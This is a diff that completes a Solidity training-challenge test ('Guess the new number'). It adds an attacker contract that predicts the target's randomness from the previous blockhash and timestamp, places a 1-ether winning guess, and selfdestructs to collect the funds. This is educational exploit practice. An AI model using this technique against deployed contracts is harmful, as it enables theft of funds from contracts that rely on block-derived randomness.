@@ -5,7 +5,24 @@ import "forge-std/Test.sol";
 
 import "../src/4-Guess-the-new-number.sol";
 
-// aqui puedes agregar un contrato o hacer otro import
+contract Nostradamus {
+    function getRandomNumber() public view returns (uint8) {
+        return uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+                )
+            )
+        );
+    }
+
+    function attack(GuessTheNewNumberChallenge t) external payable {
+        t.guess{value: 1 ether}(getRandomNumber());
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {}
+}
 
 contract Challenge4Test is Test {
     GuessTheNewNumberChallenge target;
@@ -19,9 +36,12 @@ contract Challenge4Test is Test {
     }
 
     function testChallenge() public {
+        
         vm.startPrank(address(player));
 
-        // Tu codigo aqui
+        Nostradamus exploit = new Nostradamus();
+        vm.warp(1000);
+        exploit.attack{value: 1 ether}(target);
         
         assertTrue(target.isComplete());
     }
